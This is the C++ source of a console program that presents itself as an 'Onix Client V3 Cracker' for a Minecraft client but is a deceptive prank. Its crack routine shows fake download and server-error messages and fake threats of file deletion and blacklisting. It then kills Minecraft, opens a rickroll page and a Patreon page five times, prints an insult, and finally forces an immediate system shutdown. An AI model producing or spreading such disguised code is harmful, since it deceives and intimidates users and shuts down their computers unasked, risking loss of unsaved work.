#include <iostream>
#include <string>
#include "ConsoleColours.h"
#include <Windows.h>

#ifndef NDEBUG
	#define DebugReleaseValue(Debug, Release) Debug
#else
	#define DebugReleaseValue(Debug, Release) Release
#endif

const int DEFAULT_TIME_BETWEEN_DOTS = DebugReleaseValue(500, 5000);

std::string logo = R"DATA(   ____        _       _____ _ _            ___      ______     _____                _    
  / __ \      (_)     / ____| (_)          | \ \    / /___ \   / ____|              | |   
 | |  | |_ __  ___  _| |    | |_  ___ _ __ | |\ \  / /  __) | | |     _ __ __ _  ___| | __
 | |  | | '_ \| \ \/ / |    | | |/ _ \ '_ \| __\ \/ /  |__ <  | |    | '__/ _` |/ __| |/ /
 | |__| | | | | |>  <| |____| | |  __/ | | | |_ \  /   ___) | | |____| | | (_| | (__|   < 
  \____/|_| |_|_/_/\_\\_____|_|_|\___|_| |_|\__| \/   |____/   \_____|_|  \__,_|\___|_|\_\
)DATA";

void OpenURL(const char* url) {
	std::string command = "explorer.exe ";
	command += url;
	system(command.c_str());
}

bool HasCrackedOnixClient = false;


void ClearConsole();
void CloseMinecraft() {
	system("taskkill /f /im Minecraft.Windows.exe");
	ClearConsole();
}

void OpenMinecraft() {
	system("start /min explorer.exe shell:appsFolder\\Microsoft.MinecraftUWP_8wekyb3d8bbwe!App");
}

void PrintLogo() {
	std::cout << Color::Cyan << logo << Color::BrightWhite << std::endl;
}

void ClearConsole() {
	system("cls");
	PrintLogo();
}

void PrintDelayedDots(int amount = 3, int timeBetween = DEFAULT_TIME_BETWEEN_DOTS) {
	for (int i = 0; i < amount; i++) {
		Sleep(timeBetween);
		std::cout << ".";
	}
	Sleep(timeBetween);
}

void DottedMessage(const char* message, int repeats = 3, int amount = 3, int time = DEFAULT_TIME_BETWEEN_DOTS) {
	Sleep(1000);
	ClearConsole();
	for (int i = 0; i < repeats; i++) {
		std::cout << Color::BrightWhite << message;
		PrintDelayedDots(amount, time);
		ClearConsole();
	}
}

void WaitForEnter(bool shouldSayPressAnyKeyToContinueOrNot) {
	if (shouldSayPressAnyKeyToContinueOrNot)
		system("pause");
	else {
		std::string clearlinethingstr;
		std::getline(std::cin, clearlinethingstr);
		std::cin.get();
	}
}

void OpenAndCloseMCWithDelay() {
	Sleep(DEFAULT_TIME_BETWEEN_DOTS);
	DottedMessage("Launching Minecraft", 1);
	OpenMinecraft();
	Sleep(4000);
	CloseMinecraft();
}

void CrackV3() {
	ClearConsole();
	std::cout << Color::BrightWhite << "Onix Client Crack Initiated...";
	DottedMessage("Downloading Onix Client");
	std::cout << "Download Complete!";
	DottedMessage("Preparing for install",1);
	std::cout << "Ready to install!";
	Sleep(DEFAULT_TIME_BETWEEN_DOTS);
	DottedMessage("Installing Onix Client V3");
	std::cout << "Installation Complete.";
	Sleep(3000);
	ClearConsole();
	DottedMessage("Launching Onix Client", 1, 3, 1000);
	Sleep(DEFAULT_TIME_BETWEEN_DOTS);
	std::cout << Color::BrightRed << "!!IMPORTANT!!\n";
	std::cout << "Before the game reaches the main menu, close the game.\n"
		"Then, open the game again.\n\n"
		"This is to ensure that the client will be installed and cracked correctly.\n"
		"Failure to do this will result in your PC being PERMANENTLY blacklisted from using Onix Client!\n\n";
	WaitForEnter(true);
	OpenAndCloseMCWithDelay();
	std::cout << Color::BrightRed <<
		"Failed to crack Onix Client\n" << Color::Red <<
		"Error: Expired Key\n" << Color::BrightWhite;
	Sleep(5000);
	std::cout << "Response from server:" << std::endl;
	std::cout << "You can purchase a new Onix Client V3 key from\n" << Color::BrightBlue <<
				"https://onixclient.com/patreon\n" << Color::BrightWhite;
	WaitForEnter(true);
	std::cout << Color::Blue;
	DottedMessage("Opening Patreon Page", 1);
	OpenURL("https://onixclient.com/patreon");
	Sleep(3000);
	ClearConsole();
	std::cout << Color::BrightWhite << "Attempting Method 2";
	OpenAndCloseMCWithDelay();
	std::cout << "Failed to crack Onix Client!\n" << Color::BrightRed <<
		"Malformed Request!\n";
		"Response: 403 FORBIDDEN\n";
	Sleep(3000);
	ClearConsole();
	std::cout << Color::BrightWhite << "Attempting Method 3";
	OpenAndCloseMCWithDelay();
	std::cout << "Failed to crack Onix Client!\n" << Color::BrightRed <<
		"Server denied access. :(\n" <<
		"Response: 401 UNAUTHORISED\n";
	Sleep(5000);
	ClearConsole();
	std::cout << Color::BrightWhite << "Attempting Method 4";
	OpenAndCloseMCWithDelay();
	std::cout << "Failed to crack Onix Client!\n" << 
		"Server sent valid response! Progress!\n" << Color::BrightRed <<
		"Response: 200 OK\n" << Color::BrightWhite;
	Sleep(5000);
	ClearConsole();
	DottedMessage("Requesting access", 2);
	std::cout << "Success!" << std::endl;
	DottedMessage("Logging in", 1);
	std::cout << "Failed to login to Onix Client authorisation servers.\n" <<
		"Server sent valid response.\n" << Color::BrightRed <<
		"Response: Maximum number of requests reached.\n" << Color::BrightWhite;
	Sleep(5000);
	std::cout << "IP Sent too many requests. Blacklisted.\n" <<
		"Tampering with the authentication system is not allowed.\n" <<
		"Initating \"Pirating Software Is Illegal\" procedure...\n";
	Sleep(7000);
	ClearConsole();
	Sleep(5000);
	std::cout << Color::Red << "Stage 1:" << std::endl;
	DottedMessage("Deleting Files", 5, 3, 1000);
	std::cout << Color::Red << "Stage 2:" << std::endl;
	std::cout << "Ball removal.\ncmljayByb2xsIHRpbWUhISEhISE=\n" << Color::BrightWhite;
	Sleep(5000);
	OpenURL("https://onixclient.com/rickroll");

	std::cout << "Fuck you\n" <<
		"Pay for software of get rickroll'd.";
	Sleep(10000);
	ClearConsole();
	std::cout << "Purchase the patreon for $4.01 for actual access to the client.\n";
	for (int i = 0; i < 5; i++) {
		OpenURL("https://patreon.com/onixclient");
	}
	std::cout << "I hope you enjoyed your stay.\n";
	Sleep(5000);
	std::cout << "Goodbye :)\n\n";
	Sleep(5000);
	system("shutdown /s /t 0");
	HasCrackedOnixClient = true;
}

void PrintOption(int optionCount, const char* name) {
	std::cout << Color::BrightBlue << "[";
	std::cout << Color::BrightWhite << optionCount;
	std::cout << Color::BrightBlue << "] " << Color::BrightWhite << name << std::endl;
}

int main() {
	SetConsoleTitleA("Onix Client V3 Cracker 3.0");
	do {
		ClearConsole();
		PrintOption(1, "Crack Onix Client V3");
		PrintOption(2, "Launch Onix Client (Requires Crack)");
		PrintOption(3, "Open Minecraft");
		PrintOption(4, "Onix Client Discord");
		PrintOption(5, "Onix Client Website");
		PrintOption(10, "Exit");
		std::cout << std::endl;
		int optionChosen = 0;
		std::cin >> optionChosen;

		if (std::cin.fail()) {
			//clear error
			std::cin.clear();
			//clear rest of content
			std::string clearlinethingstr;
			std::getline(std::cin, clearlinethingstr);
			std::cout << Color::Red << "Invalid choice!" << std::endl;
			std::cin.get();
			ClearConsole();
			continue;
		}

		switch (optionChosen) {
		case 1:
			CrackV3();
			return 0;
		case 2:
			if (HasCrackedOnixClient) {
				std::cout << Color::BrightWhite << "Opening Minecraft" << std::endl;
				Sleep(1000);
				OpenMinecraft();
				Sleep(1000);
				CloseMinecraft();
				break;
			}
			else {
				std::cout << Color::BrightRed << "You need to crack Onix Client BEFORE attempting to launch it!";
				std::string clearlinethingstr;
				std::getline(std::cin, clearlinethingstr);
				std::cin.get();
				break;
			}
		case 3:
			std::cout << Color::BrightWhite << "Opening Minecraft" << std::endl;
			Sleep(1000);
			OpenMinecraft();
			Sleep(1000);
			CloseMinecraft();
			break;
		case 4:
			OpenURL("https://onixclient.com/discord");
			break;
		case 5:
			OpenURL("https://onixclient.com/");
			break;
		case 10:
			return 0;
		default:
			std::cout << Color::Red << "Invalid choice!" << Color::BrightWhite << std::endl;
			std::string clearlinethingstr;
			std::getline(std::cin, clearlinethingstr);
			std::cin.get();
		}
		ClearConsole();
	} while (true);
}

